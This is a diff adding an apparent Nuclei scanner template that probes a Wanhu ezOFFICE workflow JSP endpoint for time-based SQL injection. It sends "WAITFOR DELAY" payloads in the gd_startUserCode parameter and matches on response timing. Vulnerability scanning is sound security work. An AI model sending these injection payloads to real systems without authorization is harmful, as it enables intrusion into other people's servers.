@@ -1,0 +1,47 @@
+id: wanhu-wf_gd-sqli
+
+info:
+  name: wanhu-wf_gd-sqli
+  author: wanhu-wf_gd-sqli
+  severity: high
+
+
+requests:
+  - raw:
+      - |
+        GET /defaultroot/login.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+
+      - |
+        GET /defaultroot/platform/bpm/ezflow/operation/ezflow_gd.jsp;?gd=1&gd_startUserCode=1%27%3B%20WAITFOR%20DELAY%20%270:0:0%27-- HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+
+      - |
+        GET /defaultroot/platform/bpm/ezflow/operation/ezflow_gd.jsp;?gd=1&gd_startUserCode=1%27%3B%20WAITFOR%20DELAY%20%270:0:2%27-- HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+
+      - |
+        @timeout: 15
+        GET /defaultroot/platform/bpm/ezflow/operation/ezflow_gd.jsp;?gd=1&gd_startUserCode=1%27%3B%20WAITFOR%20DELAY%20%270:0:4%27-- HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+        
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_2>=0  && duration_2<=2"
+          - "duration_3>=2  && duration_3<=4"
+          - "duration_4>=4  && duration_4<=6"
